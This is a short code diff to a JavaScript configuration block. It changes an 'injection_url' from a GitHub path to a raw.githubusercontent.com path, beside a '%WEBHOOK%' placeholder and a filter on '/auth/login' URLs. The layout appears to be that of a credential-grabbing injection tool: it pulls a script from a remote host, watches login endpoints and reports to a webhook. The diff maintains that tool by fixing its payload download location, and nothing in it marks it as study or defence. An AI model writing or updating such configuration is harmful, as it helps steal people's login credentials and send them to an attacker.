@@ -13,7 +13,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://github.com/Example0365/test/raw",
+    injection_url: "https://raw.githubusercontent.com/Example0365/test/refs/heads/main/raw",
     filters: {
         urls: [
             '/auth/login',
